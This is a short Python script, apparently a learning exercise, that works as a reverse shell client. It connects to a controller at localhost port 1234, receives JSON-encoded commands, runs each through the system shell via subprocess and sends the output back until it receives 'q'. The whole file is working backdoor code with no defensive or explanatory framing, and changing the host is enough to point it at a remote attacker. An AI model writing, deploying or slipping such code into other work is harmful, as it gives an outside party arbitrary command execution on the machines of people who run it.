#!/usr/bin/python
import socket
import subprocess
import json
host ='localhost'
port =1234

def reliable_send(data):
	json_data = json.dumps(data)
	s.send(json_data)

def reliable_recv():
	data=''
	while True:
		try:
			data = data + s.recv(1024)
			return json.loads(data)
		except ValueError:
			continue

def shell():
	while True:
		command = reliable_recv()
		if command == 'q':
			break
		else:
			#print (command.decode('utf8'))
			#msg = "hello"
			#s.send(bytes(msg,'utf8'))
			proc = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
			result =proc.stdout.read() + proc.stderr.read()
			reliable_send(result)


def connect():
	global s
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))


connect()
shell()
s.close()
